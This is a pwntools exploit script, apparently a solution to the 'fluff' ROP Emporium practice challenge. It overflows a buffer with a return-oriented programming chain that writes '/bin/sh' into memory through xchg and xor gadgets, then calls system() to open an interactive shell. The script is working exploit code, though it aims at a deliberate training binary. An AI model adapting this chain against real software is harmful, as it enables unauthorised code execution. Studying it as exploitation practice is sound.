#!/usr/bin/env python
from pwn import *
import struct
import binascii

bin_name = './fluff'

context.clear(arch='amd64')
context.log_level = 'debug'
proc = process(bin_name)

write_prim     = 0x40084f # mov dword ptr [rdx], ebx; pop r13; pop r12; xor byte ptr [r10], r12b; ret;
xchg_ebx_edx   = 0x400841 # xchg ebx, edx; pop r15; mov r11d, 0x602050; ret;
pop_rbx        = 0x4008ba # pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret; 

xor_r11_r11    = 0x400822 # xor r11, r11; pop r14; mov edi, 0x601050;
xchg_r11_r10   = 0x400840 # xchg r11, r10; pop r15; mov r11d, 0x602050; ret;
xor_r11_r12    = 0x40082f # xor r11, r12; pop r12; mov r13d, 0x604060; ret;
mov_edi_601050 = 0x400827 # mov edi, 0x601050; ret;
system         = 0x4005e0 # sym.imp.system

padding_len  = 40

payload = padding_len * b'A'

# ### WRITE ### #

str_write = '/bin/sh'
if len(str_write) % 4:
    str_write += '\x00' * (4 - len(str_write) % 4)

for i in range(len(str_write) // 4):
    payload += p64(pop_rbx)          # pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret; 
    payload += p64(0x601050 + i * 4) # ^ pop rbx
    payload += p64(0xffffff)         # ^ pop rbp
    payload += p64(0xffffff)         # ^ pop r12
    payload += p64(0xffffff)         # ^ pop r13
    payload += p64(0xffffff)         # ^ pop r14
    payload += p64(0xffffff)         # ^ pop r15

    payload += p64(xchg_ebx_edx) # xchg ebx, edx; pop r15; mov r11d, 0x602050; ret;
    payload += p64(0xffffff)     # ^ pop r15

    payload += p64(pop_rbx)
    payload += bytes(str_write[i * 4:(i + 1) * 4] + 'XXXX', 'ascii') # pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret; 
    payload += p64(0xffffff)     # ^ pop rbp
    payload += p64(0x3050)       # ^ pop r12
    payload += p64(0xffffff)     # ^ pop r13
    payload += p64(0xffffff)     # ^ pop r14
    payload += p64(0xffffff)     # ^ pop r15

    payload += p64(xor_r11_r12)  # xor r11, r12; pop r12; mov r13d, 0x604060; ret;
    payload += p64(0xffffff)     # ^ pop r12

    payload += p64(xchg_r11_r10) # xchg r11, r10; pop r15; mov r11d, 0x602050; ret;
    payload += p64(0xffffff)     # ^ pop r15

    payload += p64(write_prim)   # mov dword ptr [rdx], ebx; pop r13; pop r12; xor byte ptr [r10], r12b; ret;
    payload += p64(0xffffff)     # ^ pop r15
    payload += p64(0xffffff)     # ^ pop r15

# ### WRITE ### #

# ### SYSTEM EXEC ### #

payload += p64(mov_edi_601050) # mov edi, 0x601050; ret;
payload += p64(system)

# ### SYSTEM EXEC ### #

proc.recvuntil('\n> ')
proc.sendline(payload)
log.info('payload: ' + binascii.hexlify(payload).decode('ascii'))
proc.interactive()
